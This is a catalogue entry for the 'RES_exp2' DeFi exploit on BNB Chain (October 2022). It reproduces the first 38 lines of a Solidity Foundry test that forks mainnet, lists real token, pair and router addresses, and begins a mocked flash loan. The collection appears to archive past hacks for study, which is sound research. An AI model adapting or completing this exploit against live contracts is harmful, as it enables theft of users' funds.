# [?] RES_exp2 exploit (2022-10)

## Summary
Severity: Unknown
Chain: BNB Chain
Component: RES_exp2
Published: 2022-10
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RES_exp2.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
    IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant USDT_RES_PAIR = Uni_Pair_V2(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    Uni_Pair_V2 constant USDT_ALL_PAIR = Uni_Pair_V2(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    address constant dodo = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    uint256 amount;
    uint256 amount2;
    address add;

    function setUp() public {
        vm.createSelectFork("bsc", 21_948_016);
        // Adding labels to improve stack traces' readability
        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
        vm.label(address(RES_TOKEN), "RES_TOKEN");
        vm.label(address(ALL_TOKEN), "ALL_TOKEN");
        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(USDT_RES_PAIR), "USDT_RES_PAIR");
        vm.label(address(USDT_ALL_PAIR), "USDT_ALL_PAIR");
    }

    function testExploit() public payable {
        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );
        // use mint WBNB to mock flashLoan
        (bool success,) = address(WBNB_TOKEN).call{value: 30_000 ether}("");
        require(success, "Mocked flashloan failed");
        _WBNBToUSDT();
        uint256 USDTBefore = USDT_TOKEN.balanceOf(address(this));
        emit log_named_decimal_uint(
            "[Start] exchange USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RES_exp2.sol_
